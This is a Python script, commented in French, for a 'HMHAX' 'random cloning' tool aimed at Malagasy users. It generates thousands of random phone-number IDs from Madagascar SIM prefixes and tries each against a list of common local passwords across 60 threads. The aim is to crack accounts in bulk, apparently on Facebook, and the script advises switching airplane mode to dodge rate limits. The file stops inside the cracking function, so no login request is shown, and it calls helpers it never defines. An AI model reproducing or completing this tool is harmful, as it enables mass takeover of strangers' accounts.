import os
import random
import string 
import uuid
import subprocess
import requests
import sys
import getpass

# Mot de passe pour déverrouiller le script
mot_de_passe = "HMHAX808"

# Demander à l'utilisateur de saisir le mot de passe
saisie_mot_de_passe = getpass.getpass("INSÉRER LE MOT DE PASSE : ")

# Vérifier si le mot de passe saisi est correct
if saisie_mot_de_passe == mot_de_passe:
    print("MOT DE PASSE CORRECT✅. Lancement ...")
    # Exécuter la commande git pull
    try:
        subprocess.run(["git", "pull"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors de l'exécution de git pull : {e}")
        exit(1)
    print("Git pull terminé avec succès !")

# Couleurs
bblack="\033[1;30m"         # Noir
M="\033[1;31m"            # Rouge
H="\033[1;32m"         # Vert
byellow="\033[1;33m"        # Jaune
bblue="\033[1;34m"          # Bleu
P="\033[1;35m"        # Violet
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # Blanc

# Couleur aléatoire pour le logo
my_color = [B,C,P,H]
warna = random.choice(my_color)

oks=[]
cps=[]
loop=0

# Liste des couleurs pour le logo, les lignes et chaque mot
logo_colors = [B, C, P, H]
line_colors = [bblack, M, H, byellow, bblue, P, C, B]
word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]

# Logo
logo=(f'''{B}
.__              .__                     
|  |__    _____  |  |__  _____   ___  ___
|  |  \\  /     \\ |  |  \\ \\__  \\  \\  \\/  /
|   Y  \\|  Y Y  \\|   Y  \\ / __ \\_ >    < 
|___|  /|__|_|  /|___|  /(____  //__/\_ \\
     \\/       \\/      \\/      \\/       \\/
{warna}--------------------------------------------{B}
TOOL NAME : {warna}{P}HMHAX{P}{warna}
Owner: {M}HMHAX{M}
Tricks : {B}Use Airplane Mode every 5min{B}
N.B: {bblue}SIM DATA ONLY DON'T USE WIFI{bblue}
Tool: {warna}[{M}VERSION 1.5{warna}]{warna}
{warna}--------------------------------------------{B}''')

# Fonction pour afficher une ligne colorée
def linex():
    print(f'{warna}--------------------------------------------{B}')

# Fonction pour effacer l'écran et afficher le logo
def clear():
    os.system('clear')
    print(logo)

# Programme principal
def HMHAX():
    clear()
    os.system('xdg-open https://www.facebook.com/profile.php?id=100094326129648')
    print(f'{B} [{warna}01{B}] MG RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT ')
    linex()
    option = input(f' {B}[{warna}??{B}] MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' Misaotra  :)')

# Fonction pour le clonage
def BD_CLONING():
    user=[]
    clear()
    print(' MG SIMCODE : [032] [034] [038] [033]')
    code=input(' ENTER SIMCODE >> ')
    linex()
    print(' EX LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(map(str, generate_random_sequence(9)))
        user.append(nmp)
    with tred(max_workers=60) as Dipto:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' CLONING EN COURS ... ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'1234567','malala','Anjara','anjara','Antananarivo','Malagasy','Judio99','Angelina','Malala','fitiavana','mamako','Baby1234', 'babyko', 'Urus1234', 'ferari', '12345678', 'Business123', 'Zandriko', 'Papako', 'Zoroluffy', 'Onepiece' , 'Ceasar123', 'Rimka', 'Lune123', '200509', 'Love123', 'Mylova', 'Lover1234' , 'Freefire123', 'Freefire', 'freefire' , 'freefire123', '200609', '200409' , '200309', '200209', '202403', 'razana' , 'Razana' , '200109', '200009', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
            Dipto.submit(method_crack,ids,passlist)
    linex()
    print('CLONING FINISHED  ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    HMHAX()

# Fonction pour la méthode de crack
def method_crack(ids, passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
           
